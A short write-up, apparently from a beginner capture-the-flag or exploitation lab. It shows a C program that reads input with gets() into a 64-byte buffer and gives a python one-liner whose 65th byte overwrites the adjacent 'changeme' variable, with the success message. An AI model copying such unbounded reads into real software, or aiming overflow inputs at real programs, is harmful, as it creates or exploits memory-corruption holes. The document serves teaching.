The vulnerable snippet of code :

```C
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);
```

The function gets() is vulnerable to a buffer overflow, and since this code allocates 64 bytes to buffer, the 65th byte given through the user input will overwrite locals.changeme :

```bash
$ python3 -c 'print("A"*64+"1")' | ./code

Well done, the 'changeme' variable has been changed!
